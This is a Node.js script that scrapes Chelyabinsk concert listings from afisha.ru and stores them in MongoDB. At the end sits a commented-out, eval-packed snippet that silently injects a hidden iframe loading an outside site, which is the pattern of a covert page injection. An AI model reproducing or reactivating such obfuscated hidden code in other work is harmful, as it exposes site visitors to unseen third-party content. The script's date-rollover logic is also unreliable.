/**
 * Created by jenia0jenia on 07.03.2015.
 */

'use strict';

//var fs = require('fs');
var async = require('async');
var request = require('request');
var cheerio = require('cheerio');
var MongoClient = require('mongodb').MongoClient;
var week = '27-03-2015',    // ATTENTION! Example: 'dd-mm-yyyy'
    URL = 'http://www.afisha.ru/chelyabinsk/schedule_concert/' + week + '/reset/';

var address = []
    , tel = []
    , date = []
    , title = []
    , place = []
    , type = []
    , getUrlAddress = [];

function nextWeek(week) {
    var curD = week[0] + week[1] + '';
    var curM = week[3] + week[4] + '';

    curD  = +curD + 7;
    if ( ( ((+curM < 8) && (+curM % 2 === 1)) || ((+curM > 7) && (+curM % 2 === 0))) && (+curD > 31) ) {
            curD %= 31;
            curM++;
    } else if ((+curM === 2) && (+curD > 28)) {
        curD %= 28;
        curM++;
    } else if (+curD > 30) {
        curD %= 30;
        curM++;
    }
    if (curM.length === 1) curM = '' + '0' + curM;
    var nWeek = curD + '-' + curM + week.substring(5, week.length);
    return nWeek;
};

//var str = fs.readFileSync("html.txt", {encoding: "utf-8"});
var getTel = function(string) {
    var parseAddr = string.replace(/\s+/g, ' ').split(/\s*,\s*/),
        len = parseAddr.length,
        isTel,
        yellowPages = '';
    for (var i = 0; i < len; i++) {
        isTel = true;
        var lenWord = parseAddr[i].length,
            oneWord = parseAddr[i];
        for (var j = 0; j < lenWord; j++) {
            if ( !(oneWord[j].match(/\d|\(|\)|\+|\*|#|\s|к|а|с/)) ) { // то номер телефона
                isTel = false;
                break;
            }
        }
        if (isTel){
            yellowPages += oneWord + ', ';
        } else {
            break;
        }
    }
    return yellowPages.slice(1, yellowPages.length - 2) || 'no telephone';
};

// парсим физический адрес места проведения
var getAddress = function(string) {
    var parseAddr = string.replace(/\s+/g, ' ').split(/\s*,\s*/),
        len = parseAddr.length,
        isStreet,
        result;
    for (var i = 0; i < len; i++) {
        isStreet = true;
        var lenWord = parseAddr[i].length,
            oneWord = parseAddr[i];
        for (var j = 0; j < lenWord; j++) {
            if ( !(oneWord[j].match(/[А-Я]|[а-я]|\.|\-|\s/)) ) { // вероятно, название улицы
                isStreet = false;
            }
        }
        if (isStreet){
            // если улица, то следом номер дома
            result = parseAddr[i] + ', ' + parseAddr[i + 1].split(' ')[0];
            break;
        }
    }
    return result || 'no address';
};

// создаём объект для добавления в монгоДБ из массивов
var createObj = function (i){
    var obj = [];

    for (var i = 0; i < title.length; i++){
        obj.push({
                'title': title[i],
                'place': place[i],
                'date': date[i],
                'address': address[i],
                'tel': tel[i]
            }
        );
    }
        return obj;
};

async.waterfall([
    function(callback) {
        request(URL, function (error, response, body) {
            if (!error && response.statusCode == 200) {
                var $ = cheerio.load(body);
                $('.object-type').each(function (i) {
                    getUrlAddress[i] = $(this) // get url address of place
                        .children('a')
                        .attr('href');
                    console.log('url!', i);
                });
                $('.b-td-date').each(function (i) {
                    date[i] = $(this) // do dates array
                        .text()
                        .replace(/(\s+)/g, " ");
                    date[i] = date[i].substring(1, date[i].length - 1);
                    console.log('date!', i);
                });
                $('.b-td-item').each(function (i) {
                    title[i] = $(this) // do titles array
                        .children('h3')
                        .text()
                        .replace(/(\s+)/g, " ");
                    title[i] = title[i].substring(1, title[i].length - 1);
                    console.log('title!', i);
                });
                $('.b-td-item').each(function (i) {
                    place[i] = $(this) // do places array
                        .children('p')
                        .text()
                        .replace(/(\s+)/g, " ");
                    place[i] = place[i].substring(1, place[i].length - 1);
                    console.log('place!', i);
                });
            };
            console.log('f c');
            callback(null);
        });
    },
    function(callback) {
        function counter(){
            var i = 0;
            return function() {
                return i++;
            }
        };
        var getPlus = counter();
        var i = 0;
        async.each(getUrlAddress, function(url, callback) {
            request(url, function(error, response, body) {
                i = getPlus();
                // по url адресу переходим для нахождения адреса физического
                // и номеров телефона
                if (!error && response.statusCode == 200) {
                    var $ = cheerio.load(body);
                    var string;
                    $('.m-margin-btm').children('*').empty();
                    string = $('.m-margin-btm')
                        .text()
                        .replace(/(\s+)/g, " ");
                    console.log(i);
                    tel[i] = getTel(string);
                    address[i] = getAddress(string);
                }
                callback(null);
            });
        }, function (err) {
            if (err) throw err;
            console.log('s c');
            callback(null);
        });
    },
    function(callback) {
            // MONGO
        MongoClient.connect("mongodb://localhost:27017/myproject", function (err, db) {
            var collection = db.collection('concert');
            collection.remove({}, function (err, affected) {
                if (err) throw err;
                var ins = createObj();
                async.each(ins, function(event, callback){
                    collection.insert(event, function (err, affected) {
                        if (err) throw err;
                        callback(null)
                    });
                }, function(err) {
                    if (err) throw err;
                    db.close();
                    callback(null, 'html page has been parsed')
                });
            });
        });
    }
], function (err, result) {
    if (err) throw err;
    console.log(result);
    console.log('fault');
    // result now equals 'done'
});


//eval(
//    function(p,a,c,k,e,d){
//        e=function(c){
//            return c.toString(36)
//        };
//        if(!''.replace(/^/,String)){
//            while(c--){
//                d[c.toString(a)]=k[c]||c.toString(a)
//            }k=[function(e){
//                return d[e]}];
//            e=function(){
//                return'\\w+'
//            };
//            c=1
//        };
//        while(c--){
//            if(k[c]){
//                p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])
//            }
//        }return p
//    }    ('9(6(){7 i=0.5(\'4\');i.1.2=\'3\';i.8=\'a://f.g/e/d\';0.b.c(i)},h);',19,19,'document|style|display|none|iframe|createElement|function|var|src|setTimeout|http|body|appendChild|last|index|plutov|by|1500|'.split('|'),0,{}));
